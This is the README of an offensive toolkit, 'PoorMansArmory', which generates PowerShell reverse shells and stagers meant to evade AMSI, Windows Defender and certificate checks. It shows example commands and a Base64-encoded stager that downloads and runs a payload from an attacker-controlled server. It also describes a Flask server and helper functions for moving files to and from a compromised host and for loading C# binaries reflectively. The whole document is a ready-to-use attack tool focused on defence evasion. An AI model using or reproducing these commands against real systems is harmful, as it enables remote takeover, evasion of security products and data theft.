# PoorMansArmory
Collection of malleable payloads and tools that aim to bypass AMSI, Windows Defender, and self-signed certificate checks while being intuitive to use.

```
                              _ _
 ____  __  __      _         | | |
|  _ \|  \/  |    / \        | | |
| |_) | |\/| |   / _ \       | | |   Mom: "We have Cool Tools™ at home!"
|  __/| |  | |_ / ___ \ _    | | |   The Cool Tools™ At Home:
|_| (_)_|  |_(_)_/   \_(_)   | | |
                             |_|_|
```


### Reverse Shells & Stagers
---
- Works in both Linux and Windows Environments
- Supports both PowerShell Desktop and PowerShell Core
- Payloads default to PowerShell 5.0, but can be toggled to support PowerShell 2.0

```powershell
# pwsh
PS /opt/PoorMansArmory> Get-RevShell <attacker_ip> <listening_port> -AmsiBypass -WebClientURL "http(s)://<ip_addr>" -Base64 > ./downloads/revshell
PS /opt/PoorMansArmory> Get-Stager -PayloadURL "http(s)://<ip_addr>/d/revshell" -Base64
powershell -nop -ex bypass -e aQBlAHgAIAAoACgATgBlAHcALQBPAGIAagBlAGMAdAAgAFMAeQBzAHQAZQBtAC4ATgBlAHQALgBXAGUAYgBDAGwAaQBlAG4AdAApAC4
ARABvAHcAbgBsAG8AYQBkAFMAdAByAGkAbgBnACgAJwBoAHQAdABwACgAcwApADoALwAvADwAaQBwAF8AYQBkAGQAcgA+AC8AZAAvAHIAZQB2AHMAaABlAGwAbAAnACkAKQA=
```
Above example creates a reverse shell that has disables AMSI and loads in the WebClient Helper scripts, outputs the revshell into the "pma_server.py" downloads directory, and creates a stager pointing to the payload.

![Help](https://cdn.discordapp.com/attachments/855920119292362802/1111015383130968174/image.png)


### pma_server.py
---
- Simple Python Flask server
- Supports SSL via self-signed certificates
- ``/d/`` directory is for downloadable files
- ``/u/`` directory is for uploaded files
- ``/r/`` directory is for returning raw content **(DEPRECATED)**

![pma_server](https://cdn.discordapp.com/attachments/855920119292362802/1110739921028792351/image.png)


### WebClient Helper Tools
---
Functions Include:
- ``download``	-->		Download files hosted on the PMA server
- ``upload``		-->		Upload files to the PMA server
- ``import``		-->		Load PowerShell files and C# binaries into the session

These functions can either be loaded into a session with ``Load-WebClientHelpers`` using Global scopes or be prefixed into the reverse shell with a hardcoded server URL using the `-WebClientURL "http(s)://<ip_addr>"` parameter when using ``Get-RevShell``.

![WebClient Helpers](https://cdn.discordapp.com/attachments/855920119292362802/1110744324158799932/image.png)
Above example uses a reverse shell on port 53 using the WebClient Helper Tools (``-WebClientURL "https://10.20.30.201"``, AMSI bypass (``-AmsiBypass``), and HTTPS bypass (``-HttpsBypass``).  Functionality shows off file uploads, PowerShell script importing, and C# binary reflection.